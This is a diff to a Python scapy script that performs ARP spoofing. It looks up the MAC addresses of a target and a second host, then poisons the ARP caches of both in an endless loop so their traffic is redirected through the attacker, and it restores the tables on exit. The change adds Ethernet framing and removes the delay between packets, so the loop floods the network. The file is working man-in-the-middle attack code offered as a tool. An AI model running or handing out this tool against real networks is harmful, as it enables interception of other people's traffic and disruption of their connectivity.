@@ -1,8 +1,6 @@
 #!/bin/python
 import scapy.all as scapy
 import argparse
-import os
-import time
 
 def arp_ask(target_ip):
     """Send an ARP request to get the MAC address of a target IP."""
@@ -16,39 +14,47 @@ def arp_ask(target_ip):
     return answered[0][1].hwsrc  # Return the MAC address of the target
 
 def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
-    """Send a fake ARP response to trick the target into associating the wrong MAC address."""
-    if not target_mac:
-        print(f"[!] Could not spoof {target_ip} - No MAC address found.")
+    """Send a fake ARP response with correct Ethernet destination MAC."""
+    if not target_mac or not spoof_mac:
+        print(f"[!] Cannot spoof {target_ip} or {spoof_ip} - MAC address not found.")
         return
-    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2)
-    scapy.send(arp_response, verbose=False)
+
+    print(f"[+] Sending ARP spoof to {target_ip} (hwdst={target_mac}, psrc={spoof_ip}, hwsrc={spoof_mac})")
+
+    # Création du paquet avec en-tête Ethernet
+    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+    scapy.sendp(packet, verbose=False)  # Utilisation de sendp() au lieu de send()
 
 def arp_restore(target_ip, spoof_ip, target_mac, spoof_mac):
-    """Restore the correct ARP table entry by sending the real MAC address."""
+    """Restore the ARP table with the correct MAC address."""
     if not target_mac or not spoof_mac:
-        print(f"[!] Could not restore ARP table for {target_ip} or {spoof_ip}")
+        print(f"[!] Cannot restore {target_ip} or {spoof_ip} - MAC address not found.")
         return
-    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2)
-    scapy.send(arp_response, count=5, verbose=False)  # Send multiple times to ensure update
+
+    print(f"[+] Restoring ARP table for {target_ip} (hwdst={target_mac}, psrc={spoof_ip}, hwsrc={spoof_mac})")
+
+    # Création du paquet avec en-tête Ethernet
+    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+    scapy.sendp(packet, count=5, verbose=False)  # Envoi multiple pour être sûr
+
 
 def spoof(target_ip, spoof_ip):
     """Continuously send ARP spoofing packets until interrupted."""
     own_mac = scapy.get_if_hwaddr(scapy.conf.iface)  # Get the attacker's MAC address
 
     # Get the MAC addresses of the target and the spoofed IP
-    target_mac, spoof_mac = None, None
-    while not target_mac or not spoof_mac:
-        target_mac = arp_ask(target_ip)
-        spoof_mac = arp_ask(spoof_ip)
+    target_mac = arp_ask(target_ip)
+    spoof_mac = arp_ask(spoof_ip)
 
-    print(f"[+] Spoofing {target_ip} ({target_mac}) -> {spoof_ip} with {own_mac}")
-    print(f"[+] Spoofing {spoof_ip} ({spoof_mac}) -> {target_ip} with {own_mac}")
+    if not target_mac or not spoof_mac:
+        print("[!] Failed to retrieve MAC addresses. Exiting.")
+        return
 
     try:
         while True:
             arp_spoof(target_ip, spoof_ip, target_mac, own_mac)
             arp_spoof(spoof_ip, target_ip, spoof_mac, own_mac)
-            time.sleep(2)  # Reduce CPU usage
+            #time.sleep(0.1)  # Reduce CPU usage
     except KeyboardInterrupt:
         print("\n[+] Restoring ARP tables...")
         arp_restore(target_ip, spoof_ip, target_mac, spoof_mac)
